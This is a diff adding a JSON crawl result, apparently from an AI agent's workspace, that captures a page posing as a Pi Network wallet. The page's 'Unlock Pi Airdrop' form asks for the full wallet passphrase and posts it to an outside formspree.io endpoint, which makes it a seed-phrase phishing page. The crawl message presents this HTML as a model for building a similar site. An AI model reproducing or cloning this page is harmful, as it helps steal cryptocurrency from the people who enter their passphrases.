@@ -1,0 +1,15 @@
+{
+  "success": true,
+  "message": "Successfully crawled 1 pages from https://pinetworkusa.web.app/. The HTML content has been saved and should be analyzed to understand the website's structure, design patterns, navigation, content organization, and visual elements for creating a similar website.",
+  "website_url": "https://pinetworkusa.web.app/",
+  "total_pages": 1,
+  "combined_summary": "页面 1: https://pinetworkusa.web.app\n摘要: <html><body><div><p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p><p>\n\n</p><p>Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.</p><h3>Unlock Pi Airdrop</h3><title>Pi Network</title><div class=\"container\">\n    \n   <form action=\"https://formspree.io/f/mzzkdkev\" method=\"POST\">\n  \n        \n  <textarea name=\"message\" minlength=\"50\" placeholder=\"e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray\" required=\"\"></textarea>\n   <button type=\"submit\">Unlock with Passphrase</button>\n   \n</form>\n  </div></div></body></html>\n",
+  "file_paths": [
+    {
+      "page_number": 1,
+      "url": "https://pinetworkusa.web.app",
+      "html_file_path": "/workspace/knowledge_base_314pi/website_crawl/pages/page_0_pinetworkusa.web.app_index.html",
+      "summary": "<html><body><div><p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p><p>\n\n</p><p>Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.</p><h3>Unlock Pi Airdrop</h3><title>Pi Network</title><div class=\"container\">\n    \n   <form action=\"https://formspree.io/f/mzzkdkev\" method=\"POST\">\n  \n        \n  <textarea name=\"message\" minlength=\"50\" placeholder=\"e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray\" required=\"\"></textarea>\n   <button type=\"submit\">Unlock with Passphrase</button>\n   \n</form>\n  </div></div></body></html>"
+    }
+  ]
+}
